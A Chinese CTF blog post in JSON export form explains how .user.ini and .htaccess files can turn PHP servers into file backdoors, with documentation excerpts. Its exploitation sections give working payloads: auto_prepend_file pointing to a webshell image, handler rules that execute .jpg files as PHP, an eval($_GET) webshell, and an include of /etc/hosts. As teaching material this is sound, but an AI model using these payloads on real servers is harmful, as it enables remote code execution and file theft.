{"title":"两种构成文件后门的方法","slug":"两种构成文件后门的方法","date":"2019-09-18T01:19:34.000Z","updated":"2019-09-25T12:07:29.143Z","comments":true,"path":"api/articles/两种构成文件后门的方法.json","photos":[],"link":"","excerpt":null,"covers":["https://images2015.cnblogs.com/blog/804631/201602/804631-20160212221854714-1902413142.png","https://wx3.sinaimg.cn/mw690/006boCb9ly1g7c0otmfxdj313c0f476s.jpg"],"content":"<h1 id=\"两种利用文件构成PHP后门的方法：-htaccess-amp-user-ini\"><a href=\"#两种利用文件构成PHP后门的方法：-htaccess-amp-user-ini\" class=\"headerlink\" title=\"两种利用文件构成PHP后门的方法：.htaccess &amp; .user.ini\"></a>两种利用文件构成PHP后门的方法：.htaccess &amp; .user.ini</h1><h2 id=\"user-ini\"><a href=\"#user-ini\" class=\"headerlink\" title=\".user.ini\"></a>.user.ini</h2><p>以下部分摘取于P神的博客<a href=\"http://www.vuln.cn/6001\" title=\"P神博客\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/6001</a></p>\n<h3 id=\"user-ini-是什么？\"><a href=\"#user-ini-是什么？\" class=\"headerlink\" title=\".user.ini 是什么？\"></a>.user.ini 是什么？</h3><p>只要是以fastcgi运行的php都可以用<code>.user.ini</code>构成文件后门的方法。相比于<code>.htaccess</code>有更大的利用空间。 </p>\n<p>我们从php手册可以看到php.ini是php默认的配置文件，这里是配置选项列表<a href=\"https://www.php.net/manual/zh/ini.list.php\" title=\"配置项列表\" target=\"_blank\" rel=\"noopener\">https://www.php.net/manual/zh/ini.list.php</a>  从表中我们可以看到有 <code>PHP_INI_PERDIR</code>、<code>PHP_INI_SYSTEM</code>    、<code>PHP_INI_USER</code>、<code>PHP_INI_ALL</code> 四种模式，那么这四种有什么区别呢？  </p>\n<pre><code>模式                含义\nPHP_INI_USER    可在用户脚本（例如 ini_set() ）或 Windows 注册表（自 PHP 5.3 起）以及 .user.ini 中设定\nPHP_INI_PERDIR    可在 php.ini，.htaccess 或 httpd.conf 中设定\nPHP_INI_SYSTEM    可在 php.ini 或 httpd.conf 中设定\nPHP_INI_ALL        可在任何地方设定</code></pre><p>这里提到了我们可以自己设置的模式有 <code>PHP_INI_USER</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>。 在这里我们看到了 <code>.user.ini</code> 。翻阅手册<a href=\"https://www.php.net/manual/zh/configuration.file.per-user.php\" title=\"手册\" target=\"_blank\" rel=\"noopener\">https://www.php.net/manual/zh/configuration.file.per-user.php</a>可知：</p>\n<blockquote>\n<p>自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用 .htaccess 文件有同样效果。</p>\n<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>\n<p>在 .user.ini 风格的 INI 文件中只有具有 <strong>PHP_INI_PERDIR</strong> 和 <strong>PHP_INI_USER</strong> 模式的 INI 设置可被识别。</p>\n<p>两个新的 INI 指令，user_ini.filename 和 user_ini.cache_ttl 控制着用户 INI 文件的使用。</p>\n<p>user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 .user.ini。</p>\n<p>user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p>\n</blockquote>\n<p>同时与php.ini不同的是.user.ini是一个能动态加载的配置文件，修改文件内容之后不需要重启中间件只需要等待  <code>user_ini.cache_ttl</code> 时间即可被加载。</p>\n<p>也就是说 <code>.user.ini</code> 其实就是一个我们可以自定义php配置的文件。</p>\n<h3 id=\"如何利用？\"><a href=\"#如何利用？\" class=\"headerlink\" title=\"如何利用？\"></a>如何利用？</h3><p>从php配置列表里我们发现无法配置一些关键的配置，但是在构成文件后门时我们找到了两个我们可以自己配置的选项：</p>\n<p><img src=\"https://images2015.cnblogs.com/blog/804631/201602/804631-20160212221854714-1902413142.png\" alt></p>\n<p><strong>auto_prepend_file</strong></p>\n<blockquote>\n<p>Specifies the name of a file that is automatically parsed before the main file. The file is included as if it was called with the require function, so include_path is used.</p>\n<p>The special value none disables auto-prepending.</p>\n</blockquote>\n<p>指定一个文件在主文件之前自动解析，这个被包含的文件相当于在主文件之前调用了 <code>require</code> 函数，路径受到<code>include_path</code> 限制。 <code>include_path</code> 会指定 <em>require, include, fopen(), file(), readfile() and file_get_contents()</em> 这些函数执行时去哪寻找文件。</p>\n<p><strong>auto_append_file</strong></p>\n<blockquote>\n<p>Specifies the name of a file that is automatically parsed after the main file. The file is included as if it was called with the require function, so include_path is used.</p>\n<p>The special value none disables auto-appending.</p>\n<p>Note: If the script is terminated with exit(), auto-append will not occur.</p>\n</blockquote>\n<p>我们利用的重点是第一个配置，同时我们从文档也可以看出在利用时我们需要一个<strong>正常</strong>的php文件来包含我们的webshell，*<em>也就是说我们只有在文件夹里有可以正常解析(使用fastcgi模式解析)的php文件时才能这样利用。<br>*</em><br>使用时也简单直接写在<code>.user.ini</code>中</p>\n<pre><code>auto_prepend_file=webshell.jpg</code></pre><h3 id=\"效果如何？\"><a href=\"#效果如何？\" class=\"headerlink\" title=\"效果如何？\"></a>效果如何？</h3><p>环境win10+php-5.45-nts+Nginx</p>\n<p>结果如下：</p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1g7c0otmfxdj313c0f476s.jpg\" alt=\"效果如图\"></p>\n<h2 id=\"htaccess\"><a href=\"#htaccess\" class=\"headerlink\" title=\".htaccess\"></a>.htaccess</h2><h3 id=\"htaccess是什么？\"><a href=\"#htaccess是什么？\" class=\"headerlink\" title=\".htaccess是什么？\"></a>.htaccess是什么？</h3><p>翻阅apaceh官方文档<a href=\"https://httpd.apache.org/docs/current/howto/htaccess.html\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/howto/htaccess.html</a>可知</p>\n<blockquote>\n<p>.htaccess files provide a way to make configuration changes on a per-directory basis.</p>\n</blockquote>\n<p><code>.htaccess</code> 文件提供了一种目录级别的修改配置的方式。一个文件，包含一条或多条配置指令，放置于目录下，这些配置指令对当前目录和其所有子目录生效。</p>\n<h3 id=\"SetHandler\"><a href=\"#SetHandler\" class=\"headerlink\" title=\"SetHandler\"></a>SetHandler</h3><p>我们在 <code>.htaccess</code> 文件中可以通过增加 <code>handler-name</code> 来配置文件的解析方式。比如你有一个目录，你想让它被 <code>imagemap rule files</code> 解析，你可以在在 <code>.htaccess</code> 文件中加入这段代码：</p>\n<pre><code>SetHandler imap-file</code></pre><p>同样的，<code>AddType</code> 可指示文件管理系统对给出的文件名以选定的文件类型进行解析。</p>\n<pre><code>AddType image/gif .gif</code></pre><p>同时，我们也可以在以 <code>php</code> 作为 <code>Apacec module</code> 时，通过 <code>php_value</code> 来配置PHP的配置选项：</p>\n<pre><code>php_value name value</code></pre><p>设置指定的值. 只适合于 PHP_INI_ALL 和 PHP_INI_PERDIR 类型指令</p>\n<h3 id=\"如何利用？-1\"><a href=\"#如何利用？-1\" class=\"headerlink\" title=\"如何利用？\"></a>如何利用？</h3><p><strong>文件解析上传漏洞</strong></p>\n<p>.htaccess文件中定义了将上传的文件后缀名为 .jpg 格式的文件以 php 格式来解析文件。.htaccess 是apache服务器中的一个配置文件，不是上传的文件的黑名单之内，所以该类型文件可以上传成功。</p>\n<pre><code>AddType  application/x-httpd-php  .jpg</code></pre><p>还可以这样：</p>\n<pre><code># FileMatch 参数即为文件名的正则匹配\n&lt;FilesMatch &quot;sniperoj&quot;&gt;\n  SetHandler application/x-httpd-php\n&lt;/FilesMatch&gt;\n\n// sniperoj\n&lt;?php eval($_GET[&apos;c&apos;]);?&gt;</code></pre><p><strong>文件包含</strong></p>\n<pre><code>index.php: (empty)\n\n.htaccess:\n\nphp_value auto_append_file /etc/hosts</code></pre><p><strong>PHP 代码执行</strong></p>\n<pre><code>index.php: (empty)\n\n.htaccess:\n\nphp_value auto_append_file .htaccess\n#&lt;?php phpinfo();</code></pre><h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><blockquote>\n<p><a href=\"https://httpd.apache.org/docs/current/howto/htaccess.html\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/howto/htaccess.html</a></p>\n<p><a href=\"http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html\" target=\"_blank\" rel=\"noopener\">http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html</a></p>\n<p><a href=\"https://httpd.apache.org/docs/current/mod/mod_authn_core.html#authtype\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/mod/mod_authn_core.html#authtype</a></p>\n<p><a href=\"https://httpd.apache.org/docs/current/mod/core.html#sethandler\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/mod/core.html#sethandler</a></p>\n<p><a href=\"https://httpd.apache.org/docs/current/mod/mod_mime.html#addhandler\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/mod/mod_mime.html#addhandler</a></p>\n<p><a href=\"https://www.php.net/manual/en/configuration.changes.php\" target=\"_blank\" rel=\"noopener\">https://www.php.net/manual/en/configuration.changes.php</a></p>\n<p><a href=\"https://www.cnblogs.com/xia0zhiwei/p/4713438.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/xia0zhiwei/p/4713438.html</a></p>\n<p><a href=\"http://www.vuln.cn/6001\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/6001</a></p>\n</blockquote>\n","categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"}]}